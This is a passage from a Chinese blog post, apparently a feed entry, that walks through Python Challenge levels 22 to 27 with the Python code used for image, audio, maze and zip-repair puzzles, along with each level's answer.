class="comment">##           ##       ##  ##          ##          ##          ##   ## </span></span><br><span class="line">   <span class="comment">##     ##    ##     ##   ##          ##          ##          ##    ## </span></span><br><span class="line">    <span class="comment">#######      #######    ##          ##          #########   ##     ## </span></span><br><span class="line">      <span class="comment">###          ###      ##          ##          ##########  ##      ##</span></span><br></pre></td></tr></table></figure></p>
<p>其中四种情况的记录标志符“#\n”等这些可以自己设置，最后将其反转标志替换成回车\n，zlib标志替换成空字符，BZ标志替换成#即可打印出答案。</p>
<h3 id="python_challenge_22"><a href="http://www.pythonchallenge.com/pc/hex/copper.html" target="_blank" rel="external">python challenge 22</a></h3><p><code>http://www.pythonchallenge.com/pc/hex/copper.html</code><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-22.jpg" alt="22"><br>查看页面源代码提示：or maybe white.gif would be more bright<br>将copper.html替换为white.gif显示一张黑色图片，黑的什么都看不到。<br>google大法说了每帧图上有一个不同的RGB点。<br>用ps打开，由于是gif动态图只能打开其中一帧，看看RGB全是(0,0,0)，鼠标晃晃就找到了那个不同的RGB(8,8,8)。<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-22-white.jpg" alt="22-white"><br>然后我么把这张gif拆帧并将RGB(8,8,8)改为白色RGB(255,255,255),这样就能清晰的看到运动轨迹了。<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-22-white-new.gif" alt="22-white-new"><br>如果上图白点不动的话刷新下页面，或者右键图片审查元素，拿到gif图片链接浏览器直接访问。<br>代码整理在github：<a href="https://github.com/idhyt/python_challenge/blob/master/modify_gif.py" target="_blank" rel="external">https://github.com/idhyt/python_challenge/blob/master/modify_gif.py</a><br>看到运动轨迹后思路就很清楚了，该动画总共133帧，白点围绕100,100左右微小变动，<br>联想这一关的图片（一个游戏操纵杆），把这些变动的点连接起来。<br>最后的结果显示通过操纵点的运动一共画出了5个字母的轮廓，所以当白点回归到中心的时候，就是画下一个字母的信号了。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">copper</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw, ImageSequence</span><br><span class="line">    org_img = Image.open(<span class="string">"img/white.gif"</span>)</span><br><span class="line">    new_img = Image.new(<span class="string">'RGB'</span>, org_img.size, <span class="string">"black"</span>)</span><br><span class="line">    new_img_draw = ImageDraw.Draw(new_img)</span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    y = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> ImageSequence.Iterator(org_img):</span><br><span class="line">        left, upper, right, lower = org_img.getbbox()</span><br><span class="line">        dx = left-<span class="number">100</span></span><br><span class="line">        dy = upper-<span class="number">100</span></span><br><span class="line">        x += dx</span><br><span class="line">        y += dy</span><br><span class="line">        <span class="keyword">if</span> dx == dy == <span class="number">0</span>:</span><br><span class="line">            x += <span class="number">20</span></span><br><span class="line">            y += <span class="number">30</span></span><br><span class="line">        new_img_draw.point((x, y))</span><br><span class="line"></span><br><span class="line">    new_img.save(<span class="string">"img/copper.png"</span>)</span><br></pre></td></tr></table></figure></p>
<p>最后生成图片中字母即为level23入口:bonus.html<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-22-copper.png" alt="22-copper"></p>
<h3 id="python_challenge_23"><a href="http://www.pythonchallenge.com/pc/hex/bonus.html" target="_blank" rel="external">python challenge 23</a></h3><p><code>http://www.pythonchallenge.com/pc/hex/bonus.html</code><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-23.jpg" alt="23"><br>看网页源码提示：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">it can't find it. this is an undocumented module</span><br><span class="line">va gur snpr bs jung?</span><br></pre></td></tr></table></figure></p>
<p>va gur snpr bs jung?这段字符串想到了第二关的移位，由于不知道移几位，因此做个枚举<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bonus</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">shift</span><span class="params">(str_value, shift_num)</span>:</span></span><br><span class="line">        ret_list = []</span><br><span class="line">        alphas = list(str_value)</span><br><span class="line">        <span class="keyword">for</span> alpha <span class="keyword">in</span> alphas:</span><br><span class="line">            temp_ord = ord(alpha) + shift_num</span><br><span class="line">            <span class="keyword">if</span> <span class="number">97</span> &lt;= temp_ord &lt;= <span class="number">122</span>:</span><br><span class="line">                ret_list.append(chr(temp_ord))</span><br><span class="line">            <span class="keyword">elif</span> temp_ord &gt; <span class="number">122</span>:</span><br><span class="line">                ret_list.append(chr(temp_ord - <span class="number">122</span> + <span class="number">96</span>))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                ret_list.append(<span class="string">" "</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span>.join(ret_list)</span><br><span class="line"></span><br><span class="line">    org_str = <span class="string">"va gur snpr bs jung"</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">26</span>):</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"&gt;&gt;%d -&gt; %s"</span> % (i, shift(org_str, i))</span><br></pre></td></tr></table></figure></p>
<p>看输出信息：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;1 -&gt; wb hvs toqs ct kvoh</span><br><span class="line">&gt;&gt;2 -&gt; xc iwt uprt du lwpi</span><br><span class="line">&gt;&gt;3 -&gt; yd jxu vqsu ev mxqj</span><br><span class="line">&gt;&gt;4 -&gt; ze kyv wrtv fw nyrk</span><br><span class="line">&gt;&gt;5 -&gt; af lzw xsuw gx ozsl</span><br><span class="line">&gt;&gt;6 -&gt; bg max ytvx hy patm</span><br><span class="line">&gt;&gt;7 -&gt; ch nby zuwy iz qbun</span><br><span class="line">&gt;&gt;8 -&gt; di ocz avxz ja rcvo</span><br><span class="line">&gt;&gt;9 -&gt; ej pda bwya kb sdwp</span><br><span class="line">&gt;&gt;10 -&gt; fk qeb cxzb lc texq</span><br><span class="line">&gt;&gt;11 -&gt; gl rfc dyac md ufyr</span><br><span class="line">&gt;&gt;12 -&gt; hm sgd ezbd ne vgzs</span><br><span class="line">&gt;&gt;13 -&gt; in the face of what</span><br><span class="line">&gt;&gt;14 -&gt; jo uif gbdf pg xibu</span><br><span class="line">&gt;&gt;15 -&gt; kp vjg hceg qh yjcv</span><br><span class="line">&gt;&gt;16 -&gt; lq wkh idfh ri zkdw</span><br><span class="line">&gt;&gt;17 -&gt; mr xli jegi sj alex</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
<p>循环右移13位的时候出现了正常的字符串in the face of what?这意思是this..<br>再看第一个提示this is an undocumented module，在python导入this模块试试<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">The Zen of Python, by Tim Peters</span><br><span class="line"></span><br><span class="line">Beautiful is better than ugly.</span><br><span class="line">Explicit is better than implicit.</span><br><span class="line">Simple is better than complex.</span><br><span class="line">Complex is better than complicated.</span><br><span class="line">Flat is better than nested.</span><br><span class="line">Sparse is better than dense.</span><br><span class="line">Readability counts.</span><br><span class="line">Special cases aren't special enough to break the rules.</span><br><span class="line">Although practicality beats purity.</span><br><span class="line">Errors should never pass silently.</span><br><span class="line">Unless explicitly silenced.</span><br><span class="line">In the face of ambiguity, refuse the temptation to guess.</span><br><span class="line">There should be one-- and preferably only one --obvious way to do it.</span><br><span class="line">Although that way may not be obvious at first unless you're Dutch.</span><br><span class="line">Now is better than never.</span><br><span class="line">Although never is often better than *right* now.</span><br><span class="line">If the implementation is hard to explain, it's a bad idea.</span><br><span class="line">If the implementation is easy to explain, it may be a good idea.</span><br><span class="line">Namespaces are one honking great idea -- let's do more of those!</span><br></pre></td></tr></table></figure></p>
<p>In the face of ambiguity, refuse the temptation to guess.<br>答案:ambiguity</p>
<h3 id="python_challenge_24"><a href="http://www.pythonchallenge.com/pc/hex/ambiguity.html" target="_blank" rel="external">python challenge 24</a></h3><p><code>http://www.pythonchallenge.com/pc/hex/ambiguity.html</code><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-24.png" alt="24"><br>这一关的图片是一张迷宫地图(641, 641)，只不过白色部分是迷宫的墙，深色部分是路。<br>用ps查看像素点，可以看出墙部分的RGB=(255,255,255)，路的RGB=(x,0,0)。<br>根据标题from top to bottom的提示，入口就是图片的右上角，出口就是图片的左下角。<br>用ps看下右上角的入口点：<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-24-1.jpg" alt="24-1"><br>因此最开始通过getpixel(x, 0)[0]=0 找到入口点位置。<br>同理左下角出口点通过getpixel(x, 640)[0]=0 找到。<br>代码逻辑：<br>1.从入口点开始向四个方向找下个坐标点，找到后作为下一个入口点，并将当前像素点标白(255,255,255)<br>2.如果找到两个以上的下个出口坐标，即到了分岔口，备份之前的坐标队列,以此分岔口作为新的入口点,<br>3.如果未找到出口，则退回到上个分岔口继续查找。</p>
<p>最后生成的图片可以看到完成的迷宫路径：<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-24-2.png" alt="24-2"><br>显然这还不是谜底，在仔细观察迷宫的路径，可以发现每个一个像素点，路径上的颜色就会变化，<br>将这些像素点的R通道数据用二进制写到文件，打开可以发现前两位是PK ，那么这些信息其实是构成了一个ZIP文件。<br>更改后缀，解压，里面有两个文件，maze.jpg和mybroken.zip，其中maze.jpg图片上的lake就是谜底了。<br>完整代码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ambiguity</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">import</span> Image</span><br><span class="line">    org_img = Image.open(<span class="string">"img/maze.png"</span>).getdata()</span><br><span class="line">    org_img_size = org_img.size</span><br><span class="line">    new_img = Image.new(<span class="string">"RGBA"</span>, org_img_size, <span class="string">"black"</span>)</span><br><span class="line">    start_pos, end_pos = <span class="keyword">None</span>, <span class="keyword">None</span></span><br><span class="line">    start_pos_count, end_pos_count = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(org_img_size[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">if</span> org_img.getpixel((x, <span class="number">0</span>))[<span class="number">0</span>] == <span class="number">0</span>:</span><br><span class="line">            start_pos = (x, <span class="number">0</span>)</span><br><span class="line">            start_pos_count += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> org_img.getpixel((x, org_img_size[<span class="number">1</span>]-<span class="number">1</span>))[<span class="number">0</span>] == <span class="number">0</span>:</span><br><span class="line">            end_pos = (x, org_img_size[<span class="number">1</span>]-<span class="number">1</span>)</span><br><span class="line">            end_pos_count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> start_pos <span class="keyword">is</span> <span class="keyword">None</span> <span class="keyword">or</span> end_pos <span class="keyword">is</span> <span class="keyword">None</span> <span class="keyword">or</span> start_pos_count != <span class="number">1</span> <span class="keyword">or</span> end_pos_count != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"[error] : get start pos or end pos error!"</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[*] start_pos: %s and end_pos: %s"</span> % (start_pos, end_pos)</span><br><span class="line"></span><br><span class="line">    path = []</span><br><span class="line">    whole_path = []</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 右 下 左 上</span></span><br><span class="line">    dire = [(<span class="number">1</span>, <span class="number">0</span>), (<span class="number">0</span>, <span class="number">1</span>), (-<span class="number">1</span>, <span class="number">0</span>), (<span class="number">0</span>, -<span class="number">1</span>)]</span><br><span class="line">    wall = (<span class="number">255</span>,)*<span class="number">4</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> start_pos != end_pos:</span><br><span class="line">        org_img.putpixel(start_pos, wall)</span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        new_pos = start_pos</span><br><span class="line">        <span class="keyword">for</span> offset <span class="keyword">in</span> dire:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                pp = (start_pos[<span class="number">0</span>]+offset[<span class="number">0</span>], start_pos[<span class="number">1</span>]+offset[<span class="number">1</span>])</span><br><span class="line">                <span class="keyword">if</span> org_img.getpixel(pp) != wall:</span><br><span class="line">                    flag += <span class="number">1</span></span><br><span class="line">                    new_pos = pp</span><br><span class="line">            <span class="keyword">except</span> Exception, e:</span><br><span class="line">                <span class="keyword">print</span> str(e)</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">        <span class="comment"># 未找到下个出口</span></span><br><span class="line">        <span class="keyword">if</span> flag == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> path:</span><br><span class="line">                path = whole_path.pop()</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            start_pos = path[<span class="number">0</span>]</span><br><span class="line">            path = []</span><br><span class="line">        <span class="comment"># 分岔口,找到多个像素点,备份之前的坐标队列,以此分岔口作为新的入口点</span></span><br><span class="line">        <span class="keyword">elif</span> flag &gt; <span class="number">1</span>:</span><br><span class="line">            whole_path.append(path)</span><br><span class="line">            path = [start_pos]</span><br><span class="line">            start_pos = new_pos</span><br><span class="line">        <span class="comment"># 找到唯一出口,flag = 1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            path.append(start_pos)</span><br><span class="line">            start_pos = new_pos</span><br><span class="line"></span><br><span class="line">    path.append(start_pos)</span><br><span class="line">    whole_path.append(path)</span><br><span class="line"></span><br><span class="line">    org_img = Image.open(<span class="string">"img/maze.png"</span>).getdata()</span><br><span class="line">    data = []</span><br><span class="line">    <span class="keyword">for</span> path <span class="keyword">in</span> whole_path:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> path:</span><br><span class="line">            new_img.putpixel(k, wall)</span><br><span class="line">            data.append(org_img.getpixel(k)[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">    out = open(<span class="string">"files/out24.zip"</span>, <span class="string">"wb"</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data[<span class="number">1</span>::<span class="number">2</span>]:</span><br><span class="line">        out.write(chr(i))</span><br><span class="line">    out.close()</span><br><span class="line">    new_img.save(<span class="string">"img/out24.png"</span>)</span><br></pre></td></tr></table></figure></p>
<p>该题解迷宫逻辑参考<a href="http://blog.csdn.net/qaswe/article/details/9953133" target="_blank" rel="external">PythonChallenge 挑战之路 Level-24</a></p>
<h3 id="python_challenge_25"><a href="http://www.pythonchallenge.com/pc/hex/lake.html" target="_blank" rel="external">python challenge 25</a></h3><p><code>http://www.pythonchallenge.com/pc/hex/lake.html</code><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-25.jpg" alt="25"><br>谷歌大法好：<br>这是一幅拼图模样的图片，根据网页源码里的提示can you see the waves?，这一关还要用到wave模块。<br>把URL后缀改为lake1.wav，lake2.wav，…，lake25会得到25个wav文件。<br>每个wav文件为10800字节，将三个作为一个像素，可得到一张10800/3=60x60大小的图片。<br>这25个wav文件对应着刚才的25块拼图，把这25个wav文件的内容依次拼起来，会得到一张300x300大小的图片。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lake</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">    <span class="keyword">import</span> requests</span><br><span class="line">    <span class="keyword">import</span> base64</span><br><span class="line">    <span class="keyword">import</span> StringIO</span><br><span class="line">    <span class="keyword">import</span> wave</span><br><span class="line"></span><br><span class="line">    headers = &#123;</span><br><span class="line">            <span class="string">"Authorization"</span>: <span class="string">"Basic %s"</span> % base64.encodestring(<span class="string">"butter:fly"</span>).replace(<span class="string">"\n"</span>, <span class="string">""</span>)</span><br><span class="line">            &#125;</span><br><span class="line">    wave_url = <span class="string">'http://www.pythonchallenge.com/pc/hex/lake%i.wav'</span></span><br><span class="line">    new_img = Image.new(<span class="string">'RGB'</span>, (<span class="number">300</span>, <span class="number">300</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">25</span>):</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"%i/%i"</span> % (i + <span class="number">1</span>, <span class="number">25</span>)</span><br><span class="line">        wave_content = requests.get(wave_url % (i + <span class="number">1</span>), headers=headers).content</span><br><span class="line">        data = wave.open(StringIO.StringIO(wave_content))</span><br><span class="line">        patch = Image.fromstring(<span class="string">'RGB'</span>, (<span class="number">60</span>, <span class="number">60</span>), data.readframes(data.getnframes()))</span><br><span class="line">        pos = (<span class="number">60</span> * (i % <span class="number">5</span>), <span class="number">60</span> * (i / <span class="number">5</span>))</span><br><span class="line">        new_img.paste(patch, pos)</span><br><span class="line"></span><br><span class="line">    new_img.save(<span class="string">"img/out25.jpg"</span>)</span><br></pre></td></tr></table></figure></p>
<p>最终得到的图片中单词为最后答案：decent<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-25-decent.jpg" alt="25-decent"></p>
<h3 id="python_challenge_26"><a href="http://www.pythonchallenge.com/pc/hex/decent.html" target="_blank" rel="external">python challenge 26</a></h3><p><code>http://www.pythonchallenge.com/pc/hex/decent.html</code><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-26.jpg" alt="26"><br>看网页源码中的提示：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>be a man - apologize!</span><br><span class="line"><span class="number">2.</span>yo<span class="string">u've got his e-mail</span><br><span class="line">3.Hurry up, I'</span>m missing the boat</span><br></pre></td></tr></table></figure></p>
<p>提示让你先发邮件去道歉，邮箱哪里来，看19关的源码中有段没有用到的记录：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">From: leopold.moz@pythonchallenge.com</span><br><span class="line">Subject: what do you mean by "open the attachment?"</span><br><span class="line">Mime-version: 1.0</span><br><span class="line">Content-type: Multipart/mixed; boundary="===============1295515792=="</span><br><span class="line"></span><br><span class="line">It is so much easier for you, youngsters.</span><br><span class="line">Maybe my computer is out of order.</span><br><span class="line">I have a real work to do and I must know what's inside!</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
<p>找到邮箱leopold.moz@pythonchallenge.com，要道歉，发送内容是什么？<br>看23关源码中没有用到的记录：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TODO: do you owe someone an apology? now it is a good time to</span><br><span class="line">tell him that you are sorry. Please show good manners although</span><br><span class="line">it has nothing to do with this level.</span><br></pre></td></tr></table></figure></p>
<p>现在就可以去给leopold.moz@pythonchallenge.com发送内容为sorry的邮件。<br>python发邮件模块网上很多，就几行代码，这里我直接用我邮箱发，然后收到回复：<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-26-sorry.jpg" alt="26-sorry"><br>从回复的邮件里得到了一个MD5值：bbb8b499a0eef99b52c7f13f4e78c24b以及<br>它提到的broken.zip文件。这个解压文件在24关中得到，在解压的时候会提示CRC效验失败，<br>也就是说缺少部分数据。但实际上用7z解压时候是可以解压出文件的。。但正常的过程应该是<br>这个MD5值应该就是那个broken.zip的MD5值，需要将原文件的每个字节枚举看得到的MD5<br>值是否为该MD5值，从而得到正确的文件。<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">def decent():</span><br><span class="line">    import hashlib</span><br><span class="line">    f_content = open("files/mybroken.zip", "rb").read()</span><br><span class="line">    for i in range(len(f_content)):</span><br><span class="line">        for j in range(256):</span><br><span class="line">            new_content = "".join([f_content[:i], chr(j), f_content[i+1:]])</span><br><span class="line">            if hashlib.md5(new_content).hexdigest() == "bbb8b499a0eef99b52c7f13f4e78c24b":</span><br><span class="line">                open("files/mybroken_new.zip", "wb").write(new_content)</span><br><span class="line">                print "offset %d -&gt; %d" % (i, j)</span><br><span class="line">&gt;&gt;&gt; offset 1234 -&gt; 168</span><br></pre></td></tr></table></figure></p>
<p>最后解压正确的zip文件得到一张图片<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-26-mybroken.gif" alt="26-mybroken"><br>将得到的单词speed和提示Hurry up,I’m missing the boat组合起来得到下关答案speedboat</p>
<h3 id="python_challenge_27"><a href="http://www.pythonchallenge.com/pc/hex/speedboat.html" target="_blank" rel="external">python challenge 27</a></h3><p><code>http://www.pythonchallenge.com/pc/hex/speedboat.html</code><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-27.jpg" alt="27"><br>谷歌大法好，要利用调色板这些东西，调色板可参考<a href="http://www.360doc.com/content/10/0928/15/2790922_57060786.shtml" target="_blank" rel="external">调色板palette详解</a><br>首先查看源码，将zigzag.gif下载下来<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-27-zigzag.gif" alt="27-zigzag"><br>这时候每个像素的上的信息是调色板的索引号，然后就需要用实际的颜色替换索引号得到等价的图片信息。然后将这些数据与原图片信息对比，将不同的坐标点标记颜色，如新建一个黑底图片标白，最后得到一张图片。<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-27-notword.png" alt="27-notword"><br>图片左边是not，右边是word，下边是busy?，中间是钥匙，合起来是not key word。<br>然后将两个图片不相同的字节放在一起，最后经过颜色替换索引号得到的图片不同的数据得到一个bz压缩文件，解压出来并找到那些关键字里面哪些不是key word打印出，最后得到答案。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">speedboat</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">import</span> Image</span><br><span class="line">    <span class="keyword">import</span> string</span><br><span class="line">    <span class="keyword">import</span> bz2</span><br><span class="line">    <span class="keyword">import</span> keyword</span><br><span class="line">    img = Image.open(<span class="string">"img/zigzag.gif"</span>)</span><br><span class="line">    img_content = img.tostring()</span><br><span class="line">    img_plt = img.palette.getdata()[<span class="number">1</span>][::<span class="number">3</span>]</span><br><span class="line">    trans = string.maketrans(<span class="string">""</span>.join([chr(i) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>)]), img_plt)</span><br><span class="line">    img_tran = img_content.translate(trans)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># compare</span></span><br><span class="line">    diff = [<span class="string">""</span>, <span class="string">""</span>]</span><br><span class="line">    img = Image.new(<span class="string">"1"</span>, img.size, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, len(img_content)):</span><br><span class="line">        <span class="keyword">if</span> img_content[i] != img_tran[i-<span class="number">1</span>]:</span><br><span class="line">            diff[<span class="number">0</span>] += img_content[i]</span><br><span class="line">            diff[<span class="number">1</span>] += img_tran[i-<span class="number">1</span>]</span><br><span class="line">            img.putpixel(((i-<span class="number">1</span>) % img.size[<span class="number">0</span>], (i-<span class="number">1</span>)/img.size[<span class="number">0</span>]), <span class="number">1</span>)</span><br><span class="line">    img.save(<span class="string">"img/out27.png"</span>)</span><br><span class="line">    text = bz2.decompress(diff[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># extract key</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> text.split():</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> keyword.iskeyword(i):</span><br><span class="line">            <span class="keyword">print</span> i</span><br><span class="line"></span><br><span class="line"><span class="prompt">&gt;&gt;&gt; </span>../ring/bell.html</span><br><span class="line">    repeat</span><br><span class="line">    switch</span><br><span class="line">    repeat</span><br><span class="line">    ../ring/bell.html</span><br><span class="line">    ../ring/bell.html</span><br><span class="line">    ../ring/bell.html</span><br><span class="line">	...</span><br></pre></td></tr></table></figure></p>
<p>得到28关链接为<a href="http://www.pythonchallenge.com/pc/ring/bell.htm" target="_blank" rel="external">http://www.pythonchallenge.com/pc/ring/bell.htm</a><br>账户名repeat 密码是 switch</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>继续斗智斗勇中。已经开始谷歌大法好了。。</p>
